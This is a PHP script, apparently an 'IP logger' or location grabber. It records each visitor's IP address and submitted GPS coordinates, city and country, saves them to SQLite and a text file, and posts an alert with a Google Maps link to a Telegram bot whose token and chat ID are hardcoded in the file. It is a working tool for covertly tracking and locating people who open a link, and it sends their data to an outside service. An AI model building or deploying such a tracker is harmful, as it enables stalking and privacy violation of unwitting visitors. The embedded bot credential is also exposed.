<?php
// logger.php
// Logs real IP + optional GPS + Telegram alert + saves to log.txt and SQLite

// Setup
date_default_timezone_set("Asia/Kolkata");
$db = new SQLite3("log.db");
$db->exec("CREATE TABLE IF NOT EXISTS logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ip TEXT,
  latitude TEXT,
  longitude TEXT,
  city TEXT,
  country TEXT,
  timestamp TEXT
)");

// Blocklist
if (file_exists("blocklist.txt")) {
  $blocklist = file("blocklist.txt", FILE_IGNORE_NEW_LINES);
  if (in_array($_SERVER['REMOTE_ADDR'], $blocklist)) {
    http_response_code(403);
    exit("Access Denied");
  }
}

// Get IP
function getUserIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
  if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
  return $_SERVER['REMOTE_ADDR'];
}

$ip = getUserIP();
$latitude = $_POST['lat'] ?? 'N/A';
$longitude = $_POST['lon'] ?? 'N/A';
$city = $_POST['city'] ?? 'Unknown';
$country = $_POST['country'] ?? 'Unknown';
$timestamp = date("Y-m-d H:i:s");
$mapLink = "https://www.google.com/maps?q=$latitude,$longitude";

// Log to SQLite
$stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->bindValue(1, $ip);
$stmt->bindValue(2, $latitude);
$stmt->bindValue(3, $longitude);
$stmt->bindValue(4, $city);
$stmt->bindValue(5, $country);
$stmt->bindValue(6, $timestamp);
$stmt->execute();

// Log to log.txt
$log = "IP: $ip | Lat: $latitude | Lon: $longitude | City: $city | Country: $country | Time: $timestamp\n";
file_put_contents("log.txt", $log, FILE_APPEND);

// Telegram Notification
$token = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
$chat_id = "6602027873";
$msg = "🚨 New Visitor:
IP: $ip
City: $city
Country: $country
Lat: $latitude
Lon: $longitude
Time: $timestamp
$mapLink";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));

echo "Logged.";
?>
